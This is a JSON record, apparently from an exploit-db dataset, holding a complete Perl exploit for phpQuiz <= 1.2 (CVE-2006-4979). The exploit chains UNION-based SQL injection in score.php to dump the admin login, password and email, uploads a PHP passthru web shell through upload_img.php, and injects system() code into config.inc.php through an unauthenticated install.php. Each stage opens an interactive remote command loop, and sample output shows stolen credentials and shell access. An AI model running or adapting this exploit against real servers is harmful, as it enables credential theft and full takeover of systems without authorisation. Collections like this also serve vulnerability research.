{
  "id": "2376",
  "title": "phpQuiz 0.1.2 - SQL Injection / Code Execution",
  "cve": "CVE-2006-4979",
  "vuln_type": "sqli",
  "code": "######################################################\r\n# \r\n# Title: PHPQuiz <= v.1.2 Remote SQL injection/Code Execution Exploit\r\n# Vendor  : PHPQuiz\r\n# webiste : http://www.phpquiz.com\r\n# Version : <= v.1.2\r\n# Severity: Critical \r\n# Author: Simo64 / simo64_at_morx_org\r\n# MorX Security Reseach Team\r\n# http://www.morx.org\r\n# http://www.morx.org/phpquiz.txt\r\n#\r\n#   Details : \r\n#\r\n# SQL injection in score.php\r\n#***************************\r\n#\r\n#   univers var in score.php and quiz_id var in home.php are not proprely verified and can be used to inject query\r\n#\r\n#   PoC : http://localhost/phpquiz/front/?what=score&univers=[SQL]\r\n#\t\t  http://localhost/phpquiz/front/?quiz=quiz&univers=1&step=1&quiz_id=[SQL]\r\n#\r\n# Arbitary File Upload\r\n#********************** \r\n# vulnerable code in back/upload_img.php and admin/upload_img.php near lines 74-76\r\n# \r\n#  74  if (($upload) && ($ok_update == \"yes\")) {\r\n#  75\r\n#  76  if(@copy($image, $path)){\r\n#  77  .....\r\n#\r\n# $upload , $ok_update , $image , $path variables are not sanitized and can be used to upload files\r\n# \r\n#  PoC Exploit : \r\n#\r\n#  <form enctype=\"multipart/form-data\" method=\"post\" action=\"http://localhost/phpquiz/back/upload_img.php?upload=1&ok_update=yes&path=./../img_quiz/l3ez.php\">\r\n#  Download File<br>\r\n#  <input name=\"image\" type=\"file\" size=\"20\"><br>\r\n#  <input type=\"submit\" name=\"upload\" value=\"Upload\"><form>\r\n#\r\n#  phpquiz/img_quiz/ folder is by defaut writable so after uploading a simple phpshell <?passthru($cmd);?>\r\n#\r\n#  we can lanche cmd from : http://localhost/phpquiz/img_quiz/l3ez.php?cmd=ls\r\n#\r\n# PHP Code Injection\r\n#********************\r\n#\r\n# cfgphpquiz/install.php is accessible without authentification , the script is used to \r\n# save configuration setting in config.inc.php.\r\n#\r\n# Impact:\r\n# any remote user can post php code to the vulnerable file, view current configuration which contains sensitive information # such as admin password (plain text) and login\r\n#\r\n#***********************************************************************************\r\n#\r\n# simo64@localhost:~$ phpquiz.pl morx.org /phpquiz/ 1\r\n# \r\n# /-----------------------------------------------------------\\\r\n# | PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |\r\n# |            Coded by simo64 - simo64_morx.org              |\r\n# |                      www.morx.org                         |\r\n# |-----------------------------------------------------------|\r\n# |       MorX Security Research Team \u00a9                       |\r\n# \\-----------------------------------------------------------/\r\n# \r\n# Connecting to www.morx.org ...      Connected !\r\n# \r\n# [+] Injecting credentials\r\n# \r\n# Sending Data ...\r\n# \r\n# SQL injection Succeded !\r\n# \r\n#         User EMail  : admin@morx.org\r\n#         User Login  : admin\r\n#         User Passwd : password\r\n# \r\n# [+] Exec CMD by uploading a shell       Connected !\r\n# \r\n# Uploading shell ...     [OK]\r\n# \r\n# Checking if successfully Uploaded ....  [OK]\r\n# \r\n#                 NOW YOU CAN LAUNCH COMMANDS\r\n# \r\n# simo64[at]morx.org :~$ id\r\n# uid=48(apache) gid=48(apache) groups=48(apache),2522(psaserv)\r\n# simo64[at]morx.org :~$ pwd\r\n# /home/morx/public_html/phpquiz/img_quiz\r\n# simo64[at]morx.org :~$ ls\r\n# id_1.gif\r\n# id_2.gif\r\n# id_3.gif\r\n# id_4.gif\r\n# index.php\r\n# zaz.php\r\n# simo64[at]morx.org :~$ exit\r\n# \r\n#!/usr/bin/perl\r\n\r\nuse IO::Socket ;\r\nuse LWP::Simple ;\r\n\r\nprint q(\r\n\r\n/-----------------------------------------------------------\\\r\n| PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |\r\n|            Coded by simo64 - simo64_morx.org              |\r\n|                      www.morx.org                         |\r\n|-----------------------------------------------------------|\r\n|                MorX Security Research Team \u00a9              |\r\n\\-----------------------------------------------------------/\r\n\r\n);\r\n\r\nsub usage(){\r\n\r\nprint \"\\nUsage   :perl $0 siteurl /path/ userid\\n\";\r\nprint \"\\nExemple : perl $0 phpquiz.com /phpquiz/ 1\\n\";\r\n\r\n}\r\n\r\nif(!@ARGV){\r\n\t&usage();\r\n\texit(0)\r\n}\r\n\r\n$host = $ARGV[0];\r\n$path = $ARGV[1];\r\n$uid  = $ARGV[2];\r\n$success = null ;\r\n$injected = 0;\r\n$injcheck = $path.\"cfgphpquiz/config.inc.php?xD=l3fou\";\r\n$phpinject = $path.\"cfgphpquiz/install.php?submit=Valider&config_alert_email_name=%22;echo%20\\@\\$xD;\\@system(\\$morx);//MorX%20RulZ%20=)\";\r\n$injectuser = \"front/?what=score&univers=-64%20UNION%20SELECT%20null,LOGIN,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*\";\r\n$injectpass = \"front/?what=score&univers=-64%20UNION%20SELECT%20null,PWD,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*\";\r\n$injectmail = \"front/?what=score&univers=-64%20UNION%20SELECT%20null,EMAIL,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*\";\r\n\r\nsyswrite STDOUT , \"Connecting to $host ...\";\r\n\r\nmy $sock = new IO::Socket::INET ( PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\",);\r\n                                \r\n   die \"\\n\\nUnable to connect to $host \" unless($sock) ;\r\n\r\nsyswrite STDOUT , \"\\tConnected !\\n\\n\\[+] Injecting credentials\\n\\nSending Data ...\";\r\n\r\n\r\n\tprint $sock \"GET $path$injectmail HTTP/1.1\\n\";\r\n\tprint $sock \"Host: $host\\n\";\r\n\tprint $sock \"Connection: Close\\n\\n\";\r\n\r\n\twhile($res = <$sock>){\r\n\t\tif($res =~ /anim_fleche_droite.gif\" border=\"0\">&nbsp;&quot;(.*?)&quot;<\\/a>/){\r\n\t\t\t$usermail = $1 ;\r\n\t\t\t$success = \"ok\" ;\r\n\t\t\t}\r\n\t}\r\n\t\r\nif($success eq \"ok\") { \r\n\r\nsyswrite STDOUT , \"\\n\\nSQL injection Succeded !\\n\\n\";\r\nsleep 2 ;\r\nsyswrite STDOUT , \"\\tUser EMail  : $usermail\\n\";\r\n \r\n my $sock = new IO::Socket::INET ( PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\",);\r\n \r\n\tprint $sock \"GET $path$injectuser HTTP/1.1\\n\";\r\n\tprint $sock \"Host: $host\\n\";\r\n\tprint $sock \"Connection: Close\\n\\n\";\r\n\r\n\twhile($res = <$sock>){\r\n\t\tif($res =~ />&nbsp;&quot;(.*?)&quot;/){\r\n\t\t\t$userlogin = $1 ;\r\n\t\t\t}\r\n\t}\r\n\tsyswrite STDOUT , \"\\tUser Login  : $userlogin\\n\";\r\n\t\r\nmy $sock = new IO::Socket::INET ( PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\",);\r\n\r\n\tprint $sock \"GET $path$injectpass HTTP/1.1\\n\";\r\n\tprint $sock \"Host: $host\\n\";\r\n\tprint $sock \"Connection: Close\\n\\n\";\r\n\r\n\twhile($res = <$sock>){\r\n\t\tif($res =~ />&nbsp;&quot;(.*?)&quot;/){\r\n\t\t\t$userpass = $1 ;\r\n\t\t\t}\r\n\t}\r\n\r\nsyswrite STDOUT , \"\\tUser Passwd : $userpass\\n\\n\";\r\n\r\n\r\n} else {print \"\\n\\nInjecting credentials Exploit Failed !\\n\\n\";}\r\n\r\nsleep 2;\r\n\r\n# PART2 Remote Command Execution by uploaing shell\r\n\r\nsyswrite STDOUT , \"\\n[+] Exec CMD by uploading a shell\";\r\n\r\nmy $sock = new IO::Socket::INET ( PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\",);\r\n                                \r\n   die \"\\n\\nUnable to connect to $host \" unless($sock) ;\r\n\r\nsyswrite STDOUT , \"\\tConnected !\\n\\n\";\r\nsyswrite STDOUT , \"Uploading shell ...\";\r\n\r\n$data='-----------------------------7d61592213049c\r\nContent-Disposition: form-data; name=\"dir\"\r\n\r\n/\r\n-----------------------------7d61592213049c\r\nContent-Disposition: form-data; name=\"image\"; filename=\"zaz.php\"\r\nContent-Type: text/plain\r\n\r\n<?php\r\nif (get_magic_quotes_gpc()){$_GET[\\'cmd\\']=stripslashes($_GET[\\'cmd\\']);}\r\npassthru($_GET[\\'cmd\\']);\r\n?>\r\n-----------------------------7d61592213049c\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n-----------------------------7d61592213049c--\r\n';\r\n\r\n$script = $path.\"/back/upload_img.php?upload=1&ok_update=yes&path=./../img_quiz/zaz.php\";\r\n\r\n$len = length $data ;\r\n\r\n  print $sock \"POST $script HTTP/1.0\\r\\n\";\r\n  print $sock \"Content-Type: multipart/form-data; boundary=---------------------------7d61592213049c\\r\\n\";\r\n  print $sock \"Host: $host\\r\\n\";\r\n  print $sock \"Content-Length: $len\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n  print $sock $data;\r\n  \r\n syswrite STDOUT , \"\\t[OK]\\n\\nChecking if successfully Uploaded .... \";\r\n \r\nmy $sock = new IO::Socket::INET ( PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\",);\r\n\r\n print $sock \"HEAD $path\".\"img_quiz/zaz.php  HTTP/1.0\\r\\n\";\r\n print $sock \"Host: $host\\r\\n\";\r\n print $sock \"Connection: close\\n\\n\";\r\n \r\n while($rep = <$sock>){\r\n if($rep =~ /HTTP\\/1.1 200 OK/) { $success = 1; }\r\n }\r\nif($success == 1){\r\n\r\n\tprint \"\\t[OK]\\n\\n\\t\\tNOW YOU CAN LAUNCH COMMANDS\\n\\n\";\r\n\t\r\n\twhile(){\r\n\tprint \"simo64[at]morx.org :~\\$ \";\r\n\tchop($cmd=<STDIN>);\r\n\texit() if ($cmd eq 'exit');\r\n\t$result = get(\"http://$host\".$path.\"img_quiz/zaz.php?cmd=$cmd\");\r\n\tprint $result;\r\n\t}\r\n\r\n}\r\nelse { print \"\\tFailed !\\n\\nFile Upload Failed\\n\\n\" }\r\n\r\n# STEP 3 Injecting PHPcode into config.inc.php file\r\n\r\nprint \"\\n[+] Injecting PHP Code......\\n\\nConnecting ....\";\r\n\r\nmy $sock = new IO::Socket::INET (PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\",);\r\n\r\ndie \"Connot Connect to $host !\" unless($sock);\r\n\r\nprint \"\\tConnected !\\n\\nSending Data ....\\t\";\r\n\r\n\r\n\tprint $sock \"GET $phpinject HTTP/1.1\\n\";\r\n\tprint $sock \"Host: $host\\n\";\r\n\tprint $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\n\tprint $sock \"User-Agent: MorX-Zilla\\n\";\r\n\tprint $sock \"Connection: Close\\n\\n\";\r\n\t\r\nprint \"\\t OK\\n\\nChecking if code injected ...\";\r\n\r\nmy $sock = new IO::Socket::INET (PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\",);\r\n\r\n\tprint $sock \"GET $injcheck HTTP/1.1\\n\";\r\n\tprint $sock \"Host: $host\\n\";\r\n\tprint $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\n\tprint $sock \"User-Agent: MorX-Zilla\\n\";\r\n\tprint $sock \"Connection: Close\\n\\n\";\r\n\t\r\nwhile($check = <$sock>){\r\nif($check =~ /l3fou/) { $injected = 1; }\r\n}\r\nif($injected == 1 ){\r\nprint \"\\tSucceded !\\n\\n\\tNOW YOU ARE IN !\\n\\n\";\r\n\r\nwhile(){\r\n\tprint \"simo\\@morx.org :~\\$ \";\r\n\t$cmd = <STDIN>;\r\n\tchop($cmd);\r\n\texit(0) if($cmd eq \"exit\");\r\n\t$result = get(\"http://\".$host.$path.\"cfgphpquiz/config.inc.php?morx=$cmd\");\r\n\tprint $result;\r\n\t}\r\n}\r\nelse {print \"\\tFailed\\n\\nPHPCode Injection Failed !\\n\\n\";}\r\n\r\n# milw0rm.com [2006-09-16]",
  "url": "https://www.exploit-db.com/exploits/2376"
}